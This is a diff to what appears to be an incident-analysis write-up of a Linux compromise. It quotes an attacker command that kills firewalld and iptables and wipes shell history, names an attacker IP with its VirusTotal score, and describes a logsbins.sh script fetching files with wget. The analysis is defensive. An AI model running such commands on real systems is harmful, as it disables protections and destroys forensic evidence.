@@ -34,7 +34,7 @@ Suspsicous activity was detected during the earliest stages of compromise on `Li
 Device later performs a process using this command:
 
 ```bash
-bash -c "pkill firewalld  -9;pkill iptables -9;ulimit -e 999999;... -rf .bash_history; history -c
+-c "pkill firewalld  -9;pkill iptables -9;ulimit -e 999999;... rm -rf .bash_history; history -c
 ```
 [View full command → `observed-commands.md`](./observed-commands.md#bisis-ssh-brute-force-command)
 
@@ -47,7 +47,13 @@ bash -c "pkill firewalld  -9;pkill iptables -9;ulimit -e 999999;... -rf .bash_hi
 **VirusTotal Score:**
 - `194.32.145.243`: `12/94`
 
-**Note:** **
+**Note:** *From the bash command reviewed above, the execution of the `logsbins.sh` shell script triggers a `wget` request, resulting in the creation of files named after each letter of the alphabet. We can see the file `b` and `c` and it continues until it reaches `o`.*
+
+<p align="center">
+  <img src="https://github.com/user-attachments/assets/09a6b57f-0c77-49c0-b4fd-a39ba10e0a95" alt="Screenshot description" width="700"/>
+  <img src="https://github.com/user-attachments/assets/c7ed4c85-88ff-4c10-bcb9-3c6356c5a814" alt="Screenshot description" width="700"/>
+  <img src="https://github.com/user-attachments/assets/b00a6d04-c1cc-4442-af3a-4e373333d025" alt="Screenshot description" width="700"/>
+</p>
 
 
 ---
